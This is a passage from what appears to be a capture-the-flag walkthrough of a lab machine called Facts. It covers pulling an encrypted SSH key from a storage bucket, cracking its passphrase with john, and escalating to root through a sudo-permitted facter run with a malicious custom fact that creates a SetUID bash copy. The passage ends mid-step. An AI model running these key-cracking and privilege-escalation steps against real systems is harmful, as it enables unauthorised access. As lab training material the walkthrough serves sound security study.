2026-05-28 01:18:01        464 id_ed25519
```

I’ll grab a copy:

```
oxdf@hacky$ aws s3 cp s3://internal/.ssh/id_ed25519 id_ed25519
download: s3://internal/.ssh/id_ed25519 to ./id_ed25519
```

#### SSH Key Enumeration

With a typical SSH key, I can see the user by decoding the base64 and looking at the strings:

```
oxdf@hacky$ cat ~/.ssh/id_ed25519 | grep -v PRIVATE | base64 -d | strings
openssh-key-v1
none
none
ssh-ed25519
ssh-ed25519
oxdf@hacky
```

I can also see this using `ssh-keygen`:

```
oxdf@hacky$ ssh-keygen -yf ~/.ssh/id_ed25519
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPkyAYfMjgZfvFS68umG7+s40x+4Vxit2DpvhmoWJGAw oxdf@hacky
```

This key is different:

```
oxdf@hacky$ cat ./id_ed25519 | grep -v PRIVATE | base64 -d | strings
openssh-key-v1
aes256-ctr
bcrypt
ssh-ed25519
:l3'
2r'V
q^px
_Ovo
O^L8
```

“aes256-ctr” is a signal that it’s encrypted. `ssh-keygen` confirms:

```
oxdf@hacky$ ssh-keygen -yf id_ed25519 
Enter passphrase:
```

This format isn’t in `hashcat` yet, so I’ll use `john`:

```
oxdf@hacky$ /opt/john/run/ssh2john.py id_ed25519 > id_ed25519.hash
oxdf@hacky$ /opt/john/run/john ./id_ed25519.hash --wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 12 OpenMP threads
Note: Passwords longer than 10 [worst case UTF-8] to 32 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
0g 0:00:00:33 0.02% (ETA: 2026-06-02 03:59) 0g/s 78.47p/s 78.47c/s 78.47C/s star123..nugget
dragonballz      (id_ed25519)     
1g 0:00:00:41 DONE (2026-05-30 15:07) 0.02395g/s 78.18p/s 78.18c/s 78.18C/s grecia..jeter2
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

It cracks! I can save it without the passphrase:

```
oxdf@hacky$ ssh-keygen -p -f id_ed25519
Enter old passphrase: 
Key has comment 'trivia@facts.htb'
Enter new passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved with the new passphrase.
```

Now I can get the user:

```
oxdf@hacky$ ssh-keygen -yf id_ed25519
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICWYeZZS4gDH8+z1yn1hjRCpUfzY3RiH21fXq9qQIHqV trivia@facts.htb
```

And login:

```
oxdf@hacky$ ssh -i ~/keys/facts-trivia trivia@facts.htb
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)
...[snip]...
trivia@facts:~$
```

The OS is Ubuntu 25.04 as predicted [above](#initial-scanning). There’s no `user.txt` in this directory, but I can read it from the other user’s home directory:

```
trivia@facts:~$ cat ../william/user.txt
a26ad8d4************************
```

## Shell as root

### Enumeration

There isn’t much of interest in trivia’s home directory:

```
trivia@facts:~$ ls -la
total 36
drwxr-x--- 6 trivia trivia 4096 May 13 13:21 .
drwxr-xr-x 4 root   root   4096 Jan  8 17:53 ..
lrwxrwxrwx 1 root   root      9 Jan 26 11:40 .bash_history -> /dev/null
-rw-r--r-- 1 trivia trivia  220 Aug 20  2024 .bash_logout
-rw-r--r-- 1 trivia trivia 3900 Jan  8 18:19 .bashrc
drwxrwxr-x 3 trivia trivia 4096 Jan  8 18:01 .bundle
drwx------ 2 trivia trivia 4096 Jan  8 18:58 .cache
drwxrwxr-x 3 trivia trivia 4096 Jan  8 17:52 .local
-rw-r--r-- 1 trivia trivia  807 Aug 20  2024 .profile
drwx------ 2 trivia trivia 4096 May 28 01:17 .ssh
```

`.bundle` is related to Ruby packages. There is one other user with a home directory in `/home`:

```
trivia@facts:/home$ ls
trivia  william
trivia@facts:/home/william$ ls -la
total 24
drwxr-xr-x 2 william william 4096 Jan 26 11:40 .
drwxr-xr-x 4 root    root    4096 Jan  8 17:53 ..
lrwxrwxrwx 1 root    root       9 Jan 26 11:40 .bash_history -> /dev/null
-rw-r--r-- 1 william william  220 Aug 20  2024 .bash_logout
-rw-r--r-- 1 william william 3771 Aug 20  2024 .bashrc
-rw-r--r-- 1 william william  807 Aug 20  2024 .profile
-rw-r--r-- 1 root    william   33 May 28 01:18 user.txt
```

It’s world readable, and very empty. I think this is only here to host `user.txt` while making it not accessible over MinIO.

This all lines up with the users with shells set in `passwd`:

```
trivia@facts:~$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

The trivia user can run `facter` as any user without a password using `sudo`:

```
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

### facter

#### Background

`facter` is [Puppet’s](https://www.puppet.com/) cross-platform system inventory tool. Puppet uses it during catalog compilation to learn about the node it’s configuring (OS, hardware, network, mounted filesystems, installed packages, etc.). It’s written in Ruby and ships as part of the `puppetlabs-facter` gem (so the binary on this box is just a Ruby shim around the library):

```
trivia@facts:~$ file /usr/bin/facter 
/usr/bin/facter: Ruby script, ASCII text executable
```

The script is very simple:

```ruby
#!/usr/bin/ruby
# frozen_string_literal: true

require 'pathname'
require 'facter/framework/cli/cli_launcher'

Facter::OptionsValidator.validate(ARGV)
processed_arguments = CliLauncher.prepare_arguments(ARGV)

CliLauncher.start(processed_arguments)
```

It loads the `cli_launcher` modules, and then calls `start`. Ruby Gems are stored in `/usr/lib/ruby/vendor_ruby/`:

```
trivia@facts:~$ ls /usr/lib/ruby/vendor_ruby/
3.3.0  docs  facter  facter.rb  rubygems  rubygems.rb  schema  sys  sys-filesystem.rb  xmlrpc  xmlrpc.rb
```

This is actually a hint that this is installed legit software, which it is. Its [GitHub page](https://github.com/puppetlabs/facter) describes it as:

> Facter is a command-line tool that gathers basic facts about nodes (systems) such as hardware details, network settings, OS type and version, and more. These facts are made available as variables in your Puppet manifests and can be used to inform conditional expressions in Puppet.

Running it without args shows that:

```
trivia@facts:~$ facter
disks => {
  sda => {
    model => "Virtual disk",
    serial => "6000c29d9baa1a6a7f26c811f7661c76",
    size => "10.00 GiB",
    size_bytes => 10737418240,
    type => "ssd",
    vendor => "VMware",
    wwn => "0x6000c29d9baa1a6a7f26c811f7661c76"
  }
}
dmi => {
  bios => {
    release_date => "11/12/2020",
    vendor => "Phoenix Technologies LTD",
    version => "6.00"
  },
  board => {
    manufacturer => "Intel Corporation",
    product => "440BX Desktop Reference Platform"
  },
  chassis => {
    asset_tag => "No Asset Tag",
    type => "Other"
  },
  manufacturer => "VMware, Inc.",
  product => {
    name => "VMware Virtual Platform",
    version => "None"
  }
}
facterversion => 4.10.0
filesystems => btrfs,ext2,ext3,ext4,squashfs,vfat
fips_enabled => false
hypervisors => {
  vmware => {
  }
}
identity => {
  gid => 1000,
  group => "trivia",
  privileged => false,
  uid => 1000,
  user => "trivia"
}
is_virtual => true
kernel => Linux
kernelmajversion => 6.14
kernelrelease => 6.14.0-37-generic
kernelversion => 6.14.0
load_averages => {
  15m => 0.0,
  1m => 0.0,
  5m => 0.01
}
memory => {
  swap => {
    available => "2.00 GiB",
    available_bytes => 2147479552,
    capacity => "0.00%",
    total => "2.00 GiB",
    total_bytes => 2147479552,
    used => "0 bytes",
    used_bytes => 0
  },
  system => {
    available => "2.45 GiB",
    available_bytes => 2628014080,
    capacity => "26.36%",
    total => "3.32 GiB",
    total_bytes => 3568623616,
    used => "897.04 MiB",
    used_bytes => 940609536
  }
}
mountpoints => {
  / => {
    available => "1.72 GiB",
    available_bytes => 1850445824,
    capacity => "76.04%",
    device => "/dev/mapper/ubuntu--vg-ubuntu--lv",
    filesystem => "ext4",
    options => [
      "rw",
      "relatime"
    ],
    size => "7.28 GiB",
    size_bytes => 7821811712,
    used => "5.47 GiB",
    used_bytes => 5874061312
  },
  /boot => {
    available => "124.41 MiB",
    available_bytes => 130457600,
    capacity => "67.01%",
    device => "/dev/sda2",
    filesystem => "ext4",
    options => [
      "rw",
      "relatime"
    ],
    size => "408.73 MiB",
    size_bytes => 428589056,
    used => "252.75 MiB",
    used_bytes => 265031680
  },
  /dev => {
    available => "1.62 GiB",
    available_bytes => 1739132928,
    capacity => "0%",
    device => "udev",
    filesystem => "devtmpfs",
    options => [
      "rw",
      "nosuid",
      "relatime",
      "size=1698372k",
      "nr_inodes=424593",
      "mode=755",
      "inode64"
    ],
    size => "1.62 GiB",
    size_bytes => 1739132928,
    used => "0 bytes",
    used_bytes => 0
  },
  /dev/hugepages => {
    available => "0 bytes",
    available_bytes => 0,
    capacity => "100%",
    device => "hugetlbfs",
    filesystem => "hugetlbfs",
    options => [
      "rw",
      "nosuid",
      "nodev",
      "relatime",
      "pagesize=2M"
    ],
    size => "0 bytes",
    size_bytes => 0,
    used => "0 bytes",
    used_bytes => 0
  },
  /dev/mqueue => {
    available => "0 bytes",
    available_bytes => 0,
    capacity => "100%",
    device => "mqueue",
    filesystem => "mqueue",
    options => [
      "rw",
      "nosuid",
      "nodev",
      "noexec",
      "relatime"
    ],
    size => "0 bytes",
    size_bytes => 0,
    used => "0 bytes",
    used_bytes => 0
  },
  /dev/pts => {
    available => "0 bytes",
    available_bytes => 0,
    capacity => "100%",
    device => "devpts",
    filesystem => "devpts",
    options => [
      "rw",
      "nosuid",
      "noexec",
      "relatime",
      "gid=5",
      "mode=600",
      "ptmxmode=000"
    ],
    size => "0 bytes",
    size_bytes => 0,
    used => "0 bytes",
    used_bytes => 0
  },
  /dev/shm => {
    available => "1.66 GiB",
    available_bytes => 1784311808,
    capacity => "0%",
    device => "tmpfs",
    filesystem => "tmpfs",
    options => [
      "rw",
      "nosuid",
      "nodev",
      "inode64"
    ],
    size => "1.66 GiB",
    size_bytes => 1784311808,
    used => "0 bytes",
    used_bytes => 0
  },
  /run => {
    available => "339.10 MiB",
    available_bytes => 355573760,
    capacity => "0.36%",
    device => "tmpfs",
    filesystem => "tmpfs",
    options => [
      "rw",
      "nosuid",
      "nodev",
      "noexec",
      "relatime",
      "size=348500k",
      "mode=755",
      "inode64"
    ],
    size => "340.33 MiB",
    size_bytes => 356864000,
    used => "1.23 MiB",
    used_bytes => 1290240
  },
  /run/credentials/getty@tty1.service => {
    available => "1.00 MiB",
    available_bytes => 1048576,
    capacity => "0%",
    device => "tmpfs",
    filesystem => "tmpfs",
    options => [
      "ro",
      "nosuid",
      "nodev",
      "noexec",
      "relatime",
      "nosymfollow",
      "size=1024k",
      "nr_inodes=1024",
      "mode=700",
      "inode64",
      "noswap"
    ],
    size => "1.00 MiB",
    size_bytes => 1048576,
    used => "0 bytes",
    used_bytes => 0
  },
  /run/credentials/systemd-journald.service => {
    available => "1.00 MiB",
    available_bytes => 1048576,
    capacity => "0%",
    device => "tmpfs",
    filesystem => "tmpfs",
    options => [
      "ro",
      "nosuid",
      "nodev",
      "noexec",
      "relatime",
      "nosymfollow",
      "size=1024k",
      "nr_inodes=1024",
      "mode=700",
      "inode64",
      "noswap"
    ],
    size => "1.00 MiB",
    size_bytes => 1048576,
    used => "0 bytes",
    used_bytes => 0
  },
  /run/credentials/systemd-resolved.service => {
    available => "1.00 MiB",
    available_bytes => 1048576,
    capacity => "0%",
    device => "tmpfs",
    filesystem => "tmpfs",
    options => [
      "ro",
      "nosuid",
      "nodev",
      "noexec",
      "relatime",
      "nosymfollow",
      "size=1024k",
      "nr_inodes=1024",
      "mode=700",
      "inode64",
      "noswap"
    ],
    size => "1.00 MiB",
    size_bytes => 1048576,
    used => "0 bytes",
    used_bytes => 0
  },
  /run/lock => {
    available => "5.00 MiB",
    available_bytes => 5242880,
    capacity => "0%",
    device => "tmpfs",
    filesystem => "tmpfs",
    options => [
      "rw",
      "nosuid",
      "nodev",
      "noexec",
      "relatime",
      "size=5120k",
      "inode64"
    ],
    size => "5.00 MiB",
    size_bytes => 5242880,
    used => "0 bytes",
    used_bytes => 0
  },
  /run/snapd/ns => {
    available => "339.10 MiB",
    available_bytes => 355573760,
    capacity => "0.36%",
    device => "tmpfs",
    filesystem => "tmpfs",
    options => [
      "rw",
      "nosuid",
      "nodev",
      "noexec",
      "relatime",
      "size=348500k",
      "mode=755",
      "inode64"
    ],
    size => "340.33 MiB",
    size_bytes => 356864000,
    used => "1.23 MiB",
    used_bytes => 1290240
  },
  /run/snapd/ns/docker.mnt => {
    available => "0 bytes",
    available_bytes => 0,
    capacity => "100%",
    device => "nsfs",
    filesystem => "nsfs",
    options => [
      "rw"
    ],
    size => "0 bytes",
    size_bytes => 0,
    used => "0 bytes",
    used_bytes => 0
  },
  /run/user/1000 => {
    available => "340.32 MiB",
    available_bytes => 356847616,
    capacity => "0.00%",
    device => "tmpfs",
    filesystem => "tmpfs",
    options => [
      "rw",
      "nosuid",
      "nodev",
      "relatime",
      "size=348496k",
      "nr_inodes=87124",
      "mode=700",
      "uid=1000",
      "gid=1000",
      "inode64"
    ],
    size => "340.33 MiB",
    size_bytes => 356859904,
    used => "12.00 KiB",
    used_bytes => 12288
  },
  /snap/core22/2193 => {
    available => "0 bytes",
    available_bytes => 0,
    capacity => "100%",
    device => "/dev/loop0",
    filesystem => "squashfs",
    options => [
      "ro",
      "nodev",
      "relatime",
      "errors=continue",
      "threads=single"
    ],
    size => "74.00 MiB",
    size_bytes => 77594624,
    used => "74.00 MiB",
    used_bytes => 77594624
  },
  /snap/core22/2216 => {
    available => "0 bytes",
    available_bytes => 0,
    capacity => "100%",
    device => "/dev/loop4",
    filesystem => "squashfs",
    options => [
      "ro",
      "nodev",
      "relatime",
      "errors=continue",
      "threads=single"
    ],
    size => "74.00 MiB",
    size_bytes => 77594624,
    used => "74.00 MiB",
    used_bytes => 77594624
  },
  /snap/core24/1243 => {
    available => "0 bytes",
    available_bytes => 0,
    capacity => "100%",
    device => "/dev/loop1",
    filesystem => "squashfs",
    options => [
      "ro",
      "nodev",
      "relatime",
      "errors=continue",
      "threads=single"
    ],
    size => "66.88 MiB",
    size_bytes => 70123520,
    used => "66.88 MiB",
    used_bytes => 70123520
  },
  /snap/core24/1267 => {
    available => "0 bytes",
    available_bytes => 0,
    capacity => "100%",
    device => "/dev/loop7",
    filesystem => "squashfs",
    options => [
      "ro",
      "nodev",
      "relatime",
      "errors=continue",
      "threads=single"
    ],
    size => "66.88 MiB",
    size_bytes => 70123520,
    used => "66.88 MiB",
    used_bytes => 70123520
  },
  /snap/docker/3265 => {
    available => "0 bytes",
    available_bytes => 0,
    capacity => "100%",
    device => "/dev/loop3",
    filesystem => "squashfs",
    options => [
      "ro",
      "nodev",
      "relatime",
      "errors=continue",
      "threads=single"
    ],
    size => "140.63 MiB",
    size_bytes => 147456000,
    used => "140.63 MiB",
    used_bytes => 147456000
  },
  /snap/docker/3377 => {
    available => "0 bytes",
    available_bytes => 0,
    capacity => "100%",
    device => "/dev/loop6",
    filesystem => "squashfs",
    options => [
      "ro",
      "nodev",
      "relatime",
      "errors=continue",
      "threads=single"
    ],
    size => "151.50 MiB",
    size_bytes => 158859264,
    used => "151.50 MiB",
    used_bytes => 158859264
  },
  /snap/snapd/25577 => {
    available => "0 bytes",
    available_bytes => 0,
    capacity => "100%",
    device => "/dev/loop2",
    filesystem => "squashfs",
    options => [
      "ro",
      "nodev",
      "relatime",
      "errors=continue",
      "threads=single"
    ],
    size => "51.00 MiB",
    size_bytes => 53477376,
    used => "51.00 MiB",
    used_bytes => 53477376
  },
  /snap/snapd/25935 => {
    available => "0 bytes",
    available_bytes => 0,
    capacity => "100%",
    device => "/dev/loop5",
    filesystem => "squashfs",
    options => [
      "ro",
      "nodev",
      "relatime",
      "errors=continue",
      "threads=single"
    ],
    size => "48.13 MiB",
    size_bytes => 50462720,
    used => "48.13 MiB",
    used_bytes => 50462720
  },
  /tmp => {
    available => "1.66 GiB",
    available_bytes => 1784311808,
    capacity => "0%",
    device => "tmpfs",
    filesystem => "tmpfs",
    options => [
      "rw",
      "nosuid",
      "nodev",
      "nr_inodes=1048576",
      "inode64"
    ],
    size => "1.66 GiB",
    size_bytes => 1784311808,
    used => "0 bytes",
    used_bytes => 0
  }
}
networking => {
  dhcp => "10.10.10.2",
  fqdn => "facts",
  hostname => "facts",
  interfaces => {
    br-6fd3f297dc61 => {
      bindings => [
        {
          address => "172.18.0.1",
          netmask => "255.255.0.0",
          network => "172.18.0.0"
        }
      ],
      bindings6 => [
        {
          address => "fe80::b0d4:20ff:fe2f:86b8",
          netmask => "ffff:ffff:ffff:ffff::",
          network => "fe80::",
          scope6 => "link",
          flags => [
            "permanent"
          ]
        }
      ],
      ip => "172.18.0.1",
      ip6 => "fe80::b0d4:20ff:fe2f:86b8",
      mac => "b2:d4:20:2f:86:b8",
      mtu => 1500,
      netmask => "255.255.0.0",
      netmask6 => "ffff:ffff:ffff:ffff::",
      network => "172.18.0.0",
      network6 => "fe80::",
      operational_state => "up",
      physical => false,
      scope6 => "link"
    },
    docker0 => {
      bindings => [
        {
          address => "172.17.0.1",
          netmask => "255.255.0.0",
          network => "172.17.0.0"
        }
      ],
      ip => "172.17.0.1",
      mac => "fa:b6:bc:1b:31:dd",
      mtu => 1500,
      netmask => "255.255.0.0",
      network => "172.17.0.0",
      operational_state => "down",
      physical => false
    },
    eth0 => {
      bindings => [
        {
          address => "10.129.244.96",
          netmask => "255.255.0.0",
          network => "10.129.0.0"
        }
      ],
      bindings6 => [
        {
          address => "dead:beef::a0de:adff:fe98:7d31",
          netmask => "ffff:ffff:ffff:ffff::",
          network => "dead:beef::",
          scope6 => "global",
          flags => [
          ]
        },
        {
          address => "fe80::a0de:adff:fe98:7d31",
          netmask => "ffff:ffff:ffff:ffff::",
          network => "fe80::",
          scope6 => "link",
          flags => [
            "permanent"
          ]
        }
      ],
      dhcp => "10.10.10.2",
      duplex => "full",
      ip => "10.129.244.96",
      ip6 => "dead:beef::a0de:adff:fe98:7d31",
      mac => "a2:de:ad:98:7d:31",
      mtu => 1500,
      netmask => "255.255.0.0",
      netmask6 => "ffff:ffff:ffff:ffff::",
      network => "10.129.0.0",
      network6 => "dead:beef::",
      operational_state => "up",
      physical => true,
      scope6 => "global",
      speed => 10000
    },
    lo => {
      bindings => [
        {
          address => "127.0.0.1",
          netmask => "255.0.0.0",
          network => "127.0.0.0"
        }
      ],
      bindings6 => [
        {
          address => "::1",
          netmask => "ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff",
          network => "::1",
          scope6 => "host",
          flags => [
            "permanent"
          ]
        }
      ],
      ip => "127.0.0.1",
      ip6 => "::1",
      mtu => 65536,
      netmask => "255.0.0.0",
      netmask6 => "ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff",
      network => "127.0.0.0",
      network6 => "::1",
      operational_state => "unknown",
      physical => false,
      scope6 => "host"
    },
    veth9ab331b => {
      bindings6 => [
        {
          address => "fe80::2805:3cff:fe54:1045",
          netmask => "ffff:ffff:ffff:ffff::",
          network => "fe80::",
          scope6 => "link",
          flags => [
            "permanent"
          ]
        }
      ],
      ip6 => "fe80::2805:3cff:fe54:1045",
      mac => "2a:05:3c:54:10:45",
      mtu => 1500,
      netmask6 => "ffff:ffff:ffff:ffff::",
      network6 => "fe80::",
      operational_state => "up",
      physical => false,
      scope6 => "link"
    }
  },
  ip => "10.129.244.96",
  ip6 => "dead:beef::a0de:adff:fe98:7d31",
  mac => "a2:de:ad:98:7d:31",
  mtu => 1500,
  netmask => "255.255.0.0",
  netmask6 => "ffff:ffff:ffff:ffff::",
  network => "10.129.0.0",
  network6 => "dead:beef::",
  primary => "eth0",
  scope6 => "global"
}
os => {
  architecture => "amd64",
  distro => {
    codename => "plucky",
    description => "Ubuntu 25.04",
    id => "Ubuntu",
    release => {
      full => "25.04",
      major => "25.04"
    }
  },
  family => "Debian",
  hardware => "x86_64",
  name => "Ubuntu",
  release => {
    full => "25.04",
    major => "25.04"
  },
  selinux => {
    enabled => false
  }
}
partitions => {
  /dev/loop0 => {
    backing_file => "/var/lib/snapd/snaps/core22_2193.snap",
    filesystem => "squashfs",
    mount => "/snap/core22/2193",
    size => "73.95 MiB",
    size_bytes => 77545472
  },
  /dev/loop1 => {
    backing_file => "/var/lib/snapd/snaps/core24_1243.snap",
    filesystem => "squashfs",
    mount => "/snap/core24/1243",
    size => "66.84 MiB",
    size_bytes => 70090752
  },
  /dev/loop2 => {
    backing_file => "/var/lib/snapd/snaps/snapd_25577.snap",
    filesystem => "squashfs",
    mount => "/snap/snapd/25577",
    size => "50.93 MiB",
    size_bytes => 53399552
  },
  /dev/loop3 => {
    backing_file => "/var/lib/snapd/snaps/docker_3265.snap",
    filesystem => "squashfs",
    mount => "/snap/docker/3265",
    size => "140.56 MiB",
    size_bytes => 147386368
  },
  /dev/loop4 => {
    backing_file => "/var/lib/snapd/snaps/core22_2216.snap",
    filesystem => "squashfs",
    mount => "/snap/core22/2216",
    size => "73.95 MiB",
    size_bytes => 77541376
  },
  /dev/loop5 => {
    backing_file => "/var/lib/snapd/snaps/snapd_25935.snap",
    filesystem => "squashfs",
    mount => "/snap/snapd/25935",
    size => "48.09 MiB",
    size_bytes => 50421760
  },
  /dev/loop6 => {
    backing_file => "/var/lib/snapd/snaps/docker_3377.snap",
    filesystem => "squashfs",
    mount => "/snap/docker/3377",
    size => "151.43 MiB",
    size_bytes => 158789632
  },
  /dev/loop7 => {
    backing_file => "/var/lib/snapd/snaps/core24_1267.snap",
    filesystem => "squashfs",
    mount => "/snap/core24/1267",
    size => "66.85 MiB",
    size_bytes => 70094848
  },
  /dev/mapper/ubuntu--vg-swap => {
    filesystem => "swap",
    size => "2.00 GiB",
    size_bytes => 2147483648,
    uuid => "27150c7f-d59e-46ce-82fd-04e71d8045b8"
  },
  /dev/mapper/ubuntu--vg-ubuntu--lv => {
    filesystem => "ext4",
    mount => "/",
    size => "7.50 GiB",
    size_bytes => 8053063680,
    uuid => "ce23845e-5b21-4d7f-aaa6-e1a7fb7f6c40"
  },
  /dev/sda1 => {
    parttype => "21686148-6449-6e6f-744e-656564454649",
    partuuid => "6953bc54-1c25-4039-9fec-8ce40bf15777",
    size => "1.00 MiB",
    size_bytes => 1048576
  },
  /dev/sda2 => {
    filesystem => "ext4",
    mount => "/boot",
    parttype => "0fc63daf-8483-4772-8e79-3d69d8477de4",
    partuuid => "438047bf-4d21-4dfd-b751-b2a0df08d9b5",
    size => "451.00 MiB",
    size_bytes => 472907776,
    uuid => "a1e91571-c013-49be-aa84-cf520de6efbf"
  },
  /dev/sda3 => {
    filesystem => "LVM2_member",
    parttype => "e6d6d379-f507-44c2-a23c-238f2a3df928",
    partuuid => "591a74e0-66a9-4b6f-8cc5-5232be19341f",
    size => "9.56 GiB",
    size_bytes => 10261364736,
    uuid => "RBL5TO-xZmr-OdNy-IbPG-bSd7-2ciV-wjssFC"
  }
}
path => /opt/.local/share/gem/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
processors => {
  cores => 2,
  count => 2,
  extensions => [
    "x86_64",
    "x86_64-v1",
    "x86_64-v2",
    "x86_64-v3"
  ],
  isa => "x86_64",
  models => [
    "AMD EPYC 7763 64-Core Processor",
    "AMD EPYC 7763 64-Core Processor"
  ],
  physicalcount => 1,
  speed => "2.45 GHz",
  threads => 1
}
ruby => {
  platform => "x86_64-linux-gnu",
  sitedir => "/usr/local/lib/site_ruby/3.3.0",
  version => "3.3.7"
}
ssh => {
  ecdsa => {
    fingerprints => {
      sha1 => "SSHFP 3 1 5f80ec0dca53d9634f2fdac8b0f1c209e9aa9073",
      sha256 => "SSHFP 3 2 823f2360b94b7620bde03b71d4f27c93f71f536ba8faface4f56bb5fd4e41598"
    },
    key => "AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNYjzL0v+zbXt5Zvuhd63ZMVGK/8TRBsYpIitcmtFPexgvOxbFiv6VCm9ZzRBGKf0uoNaj69WYzveCNEWxdQUww=",
    type => "ecdsa-sha2-nistp256"
  },
  ed25519 => {
    fingerprints => {
      sha1 => "SSHFP 4 1 60da11a56c7a2a3db7d9a1c87150ba83b23372ce",
      sha256 => "SSHFP 4 2 7f28009f0ea5a836de1e0d98edcb37f6f895ab1910e97284d209010fde5f1330"
    },
    key => "AAAAC3NzaC1lZDI1NTE5AAAAIPCNb2NXAGnDBofpLTCGLMyF/N6Xe5LIri/onyTBifIK",
    type => "ssh-ed25519"
  },
  rsa => {
    fingerprints => {
      sha1 => "SSHFP 1 1 a536a7ec1d9da53515731158fda1c942c1acc533",
      sha256 => "SSHFP 1 2 33a5aeb8ee69ca093062443f4525e65a9a585e6612e8f401629f96397b4f5bfc"
    },
    key => "AAAAB3NzaC1yc2EAAAADAQABAAABgQC+xkTwFqUNFClhHoGrx2ce1vWJ+hbgmJJ4b9hUpVGOMe3AyY+h4mHpjB/rO21iG6b3e9HiB6A4LPG1lufrqY0Iv/lQdAyzPSyV9Oyy6VHi6wWcy5LUJYnoM6b0EWIZ92gfQHSeG6BV+IPYYVSL3nT9fR2oMSTltiElu+jdBguHehvYBPAyTP7xOEA6GgoGBdKqCBzVMsRIWAJanEA62jAEV66f5ALc0zk46E5zFG3oesDPQ2+ML7i8P5089NhlFq5kZST2Vc1vW+MnkR2TEWxLJASXtOnxrNN67LgzB7e0LIWekIL5zYar59okU2V3i3NTfUAYa1MjOEYJvaPhlbAx1NpmmD76NWjI3vLJNbBEbmgOPEJNGQ8RoYKBriIy1vFDR6s5SOYouF8UEdx/o+QaIpx9+mPNIbaij/gBlGnpq0iOYL9IvskxnOKhsQd0yhN+8wmTIP8ZkI7zUUuQBjX1hlGD4YGCsqRZLzJ23StySmIjABFVzNlE0viejCIOUL8=",
    type => "ssh-rsa"
  }
}
system_uptime => {
  days => 2,
  hours => 62,
  seconds => 225691,
  uptime => "2 days"
}
timezone => UTC
virtual => vmware
```

The version on Facts is 4.10.0:

```
trivia@facts:~$ facter --version
4.10.0
```

The `--help` is useful as well:

```
trivia@facts:~$ facter --help
Usage
=====

  facter [options] [query] [query] [...]

Options
=======
           [--color]                      Enable color output.
           [--no-color]                   Disable color output.
        -c [--config]                     The location of the config file.
           [--custom-dir]                 A directory to use for custom facts.
        -d [--debug]                      Enable debug output.
           [--external-dir]               A directory to use for external facts.
           [--hocon]                      Output in Hocon format.
        -j [--json]                       Output in JSON format.
        -l [--log-level]                  Set logging level. Supported levels are: none, trace, debug, info, warn, error, and fatal.
           [--no-block]                   Disable fact blocking.
           [--no-cache]                   Disable loading and refreshing facts from the cache
           [--no-custom-facts]            Disable custom facts.
           [--no-external-facts]          Disable external facts.
           [--no-ruby]                    Disable loading Ruby, facts requiring Ruby, and custom facts.
           [--trace]                      Enable backtraces for custom facts.
           [--verbose]                    Enable verbose (info) output.
           [--show-legacy]                Show legacy facts when querying all facts.
        -y [--yaml]                       Output in YAML format.
           [--strict]                     Enable more aggressive error reporting.
        -t [--timing]                     Show how much time it took to resolve each fact
           [--sequential]                 Resolve facts sequentially
           [--http-debug]                 Whether to write HTTP request and responses to stderr. This should never be used in production.
        -p [--puppet]                     Load the Puppet libraries, thus allowing Facter to load Puppet-specific facts.
        -v [--version]                    Print the version
           [--list-block-groups]          List block groups
           [--list-cache-groups]          List cache groups
        -h [--help]                       Help for all arguments
```

#### Exploit

`--custom-dir` describes itself as “A directory to use for custom facts”. That seems like something I can abuse. How to do that is also documented in [gtfobins](https://gtfobins.org/gtfobins/facter/).

[This page](https://github.com/puppetlabs/puppet-docs/blob/master/source/facter/2.4/custom_facts.markdown) shows how to make a custom fact, and gives this example:

```ruby
# hardware_platform.rb

Facter.add('hardware_platform') do
  setcode do
    Facter::Core::Execution.exec('/bin/uname --hardware-platform')
  end
end
```

In this example, the first line to add the `hardware_platform` fact to the framework happens at load time, and then the inner code running `uname` happens when that fact is invoked. To abuse this, I could just put malicious Ruby code in a file, and it will execute while looking for code that adds a fact. But it’s more func to create a legit fact.

Calling `facter` with no args will call every registered fact. Or I can pass a fact name.

I’ll create a fact at `/tmp/0xdf.rb`:

```ruby
Facter.add('exploit') do
  setcode do
    Facter::Core::Execution.exec('touch /tmp/0xdf')
    'Malicious fact has run'
  end
end
```

I’ll have to make sure `facter` knows to load facts from `/tmp`, but then it runs:

```
trivia@facts:~$ facter --custom-dir /tmp/ exploit
Malicious fact has run
trivia@facts:~$ facter --custom-dir /tmp/ exploit
Malicious fact has run
trivia@facts:~$ ls -l /tmp/0xdf
-rw-rw-r-- 1 trivia trivia 0 May 30 16:39 /tmp/0xdf
```

It worked! It’s owned by trivia because I didn’t run it with `sudo`. I’ll remove `/tmp/0xdf` and run `facter` as root:

```
trivia@facts:~$ sudo facter --custom-dir /tmp/ exploit
Malicious fact has run
trivia@facts:~$ ls -l /tmp/0xdf
-rw-r--r-- 1 root root 0 May 30 16:40 /tmp/0xdf
```

The new file is owned by root, showing arbitrary root execution. I’ll update the fact to have it create a SetUID / SetGID `bash`:

```ruby
Facter.add('exploit') do
  setcode do
    Facter::Core::Execution.exec('rm /var/tmp/0xdf; cp /bin/bash /var/tmp/0xdf; chmod 6777 /var/tmp/0xdf')
    'Malicious fact has run'
  end
end
```

I’m using `/var/tmp` because `/tmp` is mounted with `nosuid`:

```
